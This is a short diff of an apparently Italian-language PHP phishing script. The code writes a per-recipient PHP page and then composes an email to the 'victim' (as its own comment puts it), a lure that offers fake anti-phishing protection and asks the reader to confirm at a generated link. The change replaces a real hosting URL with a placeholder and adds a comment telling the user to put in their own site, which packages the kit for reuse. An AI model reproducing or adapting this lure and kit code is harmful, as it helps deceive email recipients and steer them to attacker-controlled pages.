@@ -50,11 +50,11 @@ fwrite ($file, " ?> ");
 fclose ($file);
 
 //DA QUESTO MOMENTO CONFIGURO LA MAIL DA INVIARE ALLA VITTIMA E LA INVIO
-
+//PERSONALIZZA L'URL DI CONFERMA QUI SOTTO MODIFICANDO SOLAMENTE IL TUO SITO CON EVENTUALI DIRECTORY 
 $oggetto = " Avviso! ";
 $messaggio = "Ciao, $nome_destinatario, vorremo offrirti una protezione più adeguata anti-phishing.
 Devi solamente confermare il tutto al seguente link: 
-http://redirecthttp.altervista.org/emaildetector/pag/$rand.php
+http://tuosito_url_da_personalizzare.com/pag/$rand.php
 Grazie!
  ";
 
